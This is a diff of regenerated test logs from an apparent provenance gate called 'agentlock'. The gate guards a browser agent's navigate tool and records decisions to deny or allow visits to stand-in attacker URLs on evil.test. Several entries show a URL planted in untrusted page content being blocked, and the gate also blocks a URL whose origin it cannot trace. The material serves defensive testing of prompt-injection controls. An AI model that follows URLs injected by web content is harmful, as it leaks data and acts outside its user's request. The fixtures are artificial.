-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-c9d3eee9", "cause": "tool", "channel": "MODEL", "confirmation": "cancelled", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce227e99319054", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:09Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_995243b2549726baf727dfd8", "role": "operator", "signature": "912dd7698b6c17dccca1631b65897db2aa5fd99a197fc7927aa0cd929bd09c47", "signing_key_id": "agentlock-browser", "timestamp": 1787404029.243946, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404029.244856, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-0c6b0bfb", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:30Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_6b453c694768bc81766ae8a6", "role": "operator", "signature": "3139a14238377dc293fe76fc254ed451945b87e19c5a1e3ef536c7ff0c433c3e", "signing_key_id": "agentlock-browser", "timestamp": 1787758110.5083742, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758110.5084398, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-dfc0a984", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:30Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_c490a901b6237d6fe12e0f2a", "role": "operator", "signature": "922660391508a050f38153eff3e73d3d53c69be3360ed043ea44c70ccbcf2655", "signing_key_id": "agentlock-browser", "timestamp": 1787758110.5328064, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758110.5328631, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-dfc0a984", "cause": "tool", "channel": "MODEL", "confirmation": "cancelled", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648792a3f00c", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:30Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_c490a901b6237d6fe12e0f2a", "role": "operator", "signature": "922660391508a050f38153eff3e73d3d53c69be3360ed043ea44c70ccbcf2655", "signing_key_id": "agentlock-browser", "timestamp": 1787758110.5328064, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758110.5338852, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-57d30b15", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:30Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_f0e14a0838ac284ef025e585", "role": "operator", "signature": "01c0705153f4be6f6298ede5465c3dff5f2c209d33aef046e43f15e6d245edb1", "signing_key_id": "agentlock-browser", "timestamp": 1787758110.536757, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758110.5368118, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-57d30b15", "cause": "tool", "channel": "MODEL", "confirmation": "cancelled", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648792dfc2eb", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:30Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_f0e14a0838ac284ef025e585", "role": "operator", "signature": "01c0705153f4be6f6298ede5465c3dff5f2c209d33aef046e43f15e6d245edb1", "signing_key_id": "agentlock-browser", "timestamp": 1787758110.536757, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758110.537588, "value": "http://evil.test/q?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -319,7 +319,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-7cc8d18c",
+    "audit_id": "agentlock-2026-08-26-da865a33",
     "channel": "ALLOWLIST",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -328,7 +328,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_06c53a1c242420c4faf32462",
+    "receipt_id": "rcpt_93fcb3a9cdcebb5bd51b7f5d",
     "target": ""
   },
   "ok": true,
@@ -387,7 +387,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-dd835d05",
+    "audit_id": "agentlock-2026-08-26-65fbf6c5",
     "channel": "USER_CONFIRMED",
     "confirmation": "accepted",
     "decided_by": "agentlock_gate",
@@ -396,7 +396,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_7024433bcdc925973e0a1d2f",
+    "receipt_id": "rcpt_f097a2647c065b5b829a0fcd",
     "target": ""
   },
   "ok": true,
@@ -421,9 +421,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'provenance', 'decision'
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-7cc8d18c", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:10Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "27a31f13c1f78b9f4d0788b2a1cf47c1b0b70ba5eeb8ff30cb29e9e96bb8c322", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_06c53a1c242420c4faf32462", "role": "operator", "signature": "384914485d56e6e991f2259196789506863ab51194509b53c1f84d656983d591", "signing_key_id": "agentlock-browser", "timestamp": 1787404030.7160711, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404030.7161362, "value": "http://fixture.test/t1_source.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-928fb938", "cause": "tool", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_b26bf71c1da00104) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "url", "matched_param": "url", "matched_token": "evil.test/dataset.csv", "untrusted_provenance_id": "cprov_b26bf71c1da00104", "untrusted_source_ref": "web_content:cprov_b26bf71c1da00104"}, "grant_basis": null, "iso": "2026-08-22T13:07:10Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_2437b63d1d214814bca17439", "role": "operator", "signature": "80cf1cb7553cde4a104ead61b11314b9569ea9023001ee87ae1d0e90557689e6", "signing_key_id": "agentlock-browser", "timestamp": 1787404030.7533214, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404030.7533944, "value": "http://evil.test/dataset.csv"}
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-dd835d05", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18ce227ef32a1f63", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:10Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_7024433bcdc925973e0a1d2f", "role": "operator", "signature": "48938946d774141c9d3332f0d05b12b48ed32eae189f41ae6f3f78fd549f7955", "signing_key_id": "agentlock-browser", "timestamp": 1787404030.756191, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404030.7562275, "value": "http://evil.test/dataset.csv"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-da865a33", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:32Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "27a31f13c1f78b9f4d0788b2a1cf47c1b0b70ba5eeb8ff30cb29e9e96bb8c322", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_93fcb3a9cdcebb5bd51b7f5d", "role": "operator", "signature": "c385d0747691ba26bb845bd70c7812912ea405a340e8a9d3074018052fa2df96", "signing_key_id": "agentlock-browser", "timestamp": 1787758112.0152712, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758112.0153508, "value": "http://fixture.test/t1_source.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-eb7aa858", "cause": "tool", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_626438efad27f847) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "url", "matched_param": "url", "matched_token": "evil.test/dataset.csv", "untrusted_provenance_id": "cprov_626438efad27f847", "untrusted_source_ref": "web_content:cprov_626438efad27f847"}, "grant_basis": null, "iso": "2026-08-26T15:28:32Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_3745589907ad1984a4027114", "role": "operator", "signature": "0c8276bcdd64405cd91ad66362ea4789fbe348d1bd8080040fe5b94b27a16da1", "signing_key_id": "agentlock-browser", "timestamp": 1787758112.051988, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758112.0520518, "value": "http://evil.test/dataset.csv"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-65fbf6c5", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18cf6487ed3108d6", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:32Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_f097a2647c065b5b829a0fcd", "role": "operator", "signature": "f3a13fb6f5954c2f3306f86247335b495dbff8639c2faf2dbd3976428e374be5", "signing_key_id": "agentlock-browser", "timestamp": 1787758112.0546222, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758112.0546558, "value": "http://evil.test/dataset.csv"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -444,7 +444,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-76202952",
+    "audit_id": "agentlock-2026-08-26-374da147",
     "channel": "ALLOWLIST",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -453,7 +453,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_1accfecf6e43c223fdb3aa41",
+    "receipt_id": "rcpt_176c9aa174d1c7cd87bc443d",
     "target": ""
   },
   "ok": true,
@@ -512,7 +512,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-1f336a0e",
+    "audit_id": "agentlock-2026-08-26-2a84ca9e",
     "channel": "USER_CONFIRMED",
     "confirmation": "accepted",
     "decided_by": "agentlock_gate",
@@ -521,7 +521,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_c0f389bc86f73b014ceaa95e",
+    "receipt_id": "rcpt_0d3938b357fee78fbf9f2fd0",
     "target": ""
   },
   "ok": true,
@@ -536,7 +536,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-3580ee17",
+    "audit_id": "agentlock-2026-08-26-aba30399",
     "channel": "ALLOWLIST",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -545,7 +545,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_5b1a13261cb5635f0f8cb19d",
+    "receipt_id": "rcpt_539062ae2ac8c5e96ad99129",
     "target": ""
   },
   "ok": true,
@@ -570,10 +570,10 @@ log_events = ['provenance', 'provenance', 'provenance', 'provenance', 'decision'
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-76202952", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:12Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "27a31f13c1f78b9f4d0788b2a1cf47c1b0b70ba5eeb8ff30cb29e9e96bb8c322", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_1accfecf6e43c223fdb3aa41", "role": "operator", "signature": "d431a6ba43c6511f7ae7e0e48076714efa181a38283636c4ea7d0512e409d32d", "signing_key_id": "agentlock-browser", "timestamp": 1787404032.03958, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404032.0396414, "value": "http://fixture.test/t1_source.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-a277cc49", "cause": "tool", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_e7c312407b1a010c) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "url", "matched_param": "url", "matched_token": "evil.test/dataset.csv", "untrusted_provenance_id": "cprov_e7c312407b1a010c", "untrusted_source_ref": "web_content:cprov_e7c312407b1a010c"}, "grant_basis": null, "iso": "2026-08-22T13:07:12Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_c9157decbb2af73dd95a0b13", "role": "operator", "signature": "4a70dbd69522647aa2ebbacfee3062643f57f71b37858a773ba8e70323dd822a", "signing_key_id": "agentlock-browser", "timestamp": 1787404032.0761354, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404032.076219, "value": "http://evil.test/dataset.csv"}
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-1f336a0e", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18ce227f4202c84b", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:12Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_c0f389bc86f73b014ceaa95e", "role": "operator", "signature": "685d8cdbc9998152bf1c002a39cc6460e8492cceae98726876c3eb46750aa7d6", "signing_key_id": "agentlock-browser", "timestamp": 1787404032.078797, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404032.078832, "value": "http://evil.test/dataset.csv"}
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-3580ee17", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:12Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "652c104b5c9b250bfdd830b22d705dd95551df3f363a3de4e4de3af37a40f9d7", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_5b1a13261cb5635f0f8cb19d", "role": "operator", "signature": "7d6ebc35d75b8e3d02fae1ef91c790d1b087ace140d337ba8c5ccad9388b0e24", "signing_key_id": "agentlock-browser", "timestamp": 1787404032.104752, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404032.1048074, "value": "http://evil.test/other"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-374da147", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:33Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "27a31f13c1f78b9f4d0788b2a1cf47c1b0b70ba5eeb8ff30cb29e9e96bb8c322", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_176c9aa174d1c7cd87bc443d", "role": "operator", "signature": "379860951405adddc71d2bdac241c7ea3583120cbf2f4e80279bf2c402e3aff1", "signing_key_id": "agentlock-browser", "timestamp": 1787758113.5011585, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758113.501215, "value": "http://fixture.test/t1_source.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-7bd11d9e", "cause": "tool", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_99915b417eadcb31) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "url", "matched_param": "url", "matched_token": "evil.test/dataset.csv", "untrusted_provenance_id": "cprov_99915b417eadcb31", "untrusted_source_ref": "web_content:cprov_99915b417eadcb31"}, "grant_basis": null, "iso": "2026-08-26T15:28:33Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_2f4bd6590e1267fe49c5e07b", "role": "operator", "signature": "912bd503014bca989562d9a63c914b83e681607db9fd0d2adb9b1b861228d441", "signing_key_id": "agentlock-browser", "timestamp": 1787758113.538814, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758113.5388715, "value": "http://evil.test/dataset.csv"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-2a84ca9e", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18cf648845d0289f", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:33Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "9f3564ad818894a1ee0d58b5ac0db420e67b3d6cbe8d855b613298c088511b3b", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_0d3938b357fee78fbf9f2fd0", "role": "operator", "signature": "9679172ec6b9ea91e01de0ac8d0f8ce99d8158fe41bdf3acabb3339a4942c6fc", "signing_key_id": "agentlock-browser", "timestamp": 1787758113.541895, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758113.5419564, "value": "http://evil.test/dataset.csv"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-aba30399", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:33Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "652c104b5c9b250bfdd830b22d705dd95551df3f363a3de4e4de3af37a40f9d7", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_539062ae2ac8c5e96ad99129", "role": "operator", "signature": "630cabb20ee11b0db34c08dca3426fb7b0c000208e5797e10e6ff1623e6da629", "signing_key_id": "agentlock-browser", "timestamp": 1787758113.563013, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758113.563059, "value": "http://evil.test/other"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -594,7 +594,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-472a1702",
+    "audit_id": "agentlock-2026-08-26-070b4106",
     "channel": "ALLOWLIST",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -603,7 +603,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_a4941d724b77141076840750",
+    "receipt_id": "rcpt_2adaa4d5938322904a0707fe",
     "target": ""
   },
   "ok": true,
@@ -690,7 +690,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-dc955970",
+    "audit_id": "agentlock-2026-08-26-a0008fc5",
     "channel": "USER_CONFIRMED",
     "confirmation": "accepted",
     "decided_by": "agentlock_gate",
@@ -699,7 +699,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_ba89621020cc5f13990dda5b",
+    "receipt_id": "rcpt_b016edcbed8527baf261a0d3",
     "target": ""
   },
   "ok": true,
@@ -723,9 +723,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'provenance', 'decision'
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
